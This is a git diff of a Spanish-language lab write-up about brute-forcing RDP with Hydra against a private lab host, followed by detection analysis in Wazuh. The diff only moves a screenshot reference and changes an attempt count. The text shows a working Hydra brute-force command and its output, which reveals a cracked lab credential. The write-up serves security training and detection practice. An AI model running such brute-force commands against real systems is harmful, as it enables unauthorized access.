@@ -71,6 +71,10 @@ P@ssw0rd
 hydra -t 2 -V -f -l soporte -P /home/kali/wordlist-lab.txt rdp://192.168.20.10
 ```
 
+### Salida exitosa de Hydra
+
+![Hydra encontrando la credencial](04-hydra-bruteforce-exitose.png)
+
 **Resultado:**
 ```
 [3389][rdp] host: 192.168.20.10   login: soporte   password: Password123
@@ -78,11 +82,9 @@ hydra -t 2 -V -f -l soporte -P /home/kali/wordlist-lab.txt rdp://192.168.20.10
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-Hydra encontró la credencial en el intento 6 de 11.
+Hydra encontró la credencial en el intento 8 de 11.
 
-### Salida exitosa de Hydra
 
-![Hydra encontrando la credencial](04-hydra-bruteforce-exitose.png)
 
 ### Análisis en Wazuh
 
